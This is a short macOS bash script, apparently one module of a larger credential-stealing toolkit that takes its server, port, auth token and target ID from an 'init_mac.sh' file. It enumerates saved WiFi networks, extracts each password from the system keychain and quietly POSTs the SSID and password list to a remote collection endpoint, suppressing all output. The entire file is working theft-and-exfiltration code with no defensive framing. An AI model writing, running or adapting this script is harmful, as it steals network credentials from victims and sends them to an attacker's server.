#!/bin/bash
# wifi_mac.sh - inherits H, P, AU, TH from init_mac.sh

OUT=""

# list all saved WiFi profiles from system keychain
PROFILES=$(networksetup -listpreferredwirelessnetworks en0 2>/dev/null | tail -n +2 | sed 's/^[[:space:]]*//')

if [ -z "$PROFILES" ]; then
    OUT="No saved WiFi profiles found."
else
    while IFS= read -r SSID; do
        [ -z "$SSID" ] && continue
        # retrieve password from keychain (may prompt if not admin)
        PASS=$(security find-generic-password -D "AirPort network password" -a "$SSID" -w 2>/dev/null)
        OUT="$OUT
SSID     : $SSID
Password : ${PASS:-(not retrievable / requires admin)}
"
    done <<< "$PROFILES"
fi

echo "$OUT" | curl -s -X POST "https://$H:$P/store/wifi" \
     -H "Authorization: $AU" \
     -H "Content-Type: text/plain" \
     -H "X-Target: $TH" \
     --data-binary @- >/dev/null 2>&1
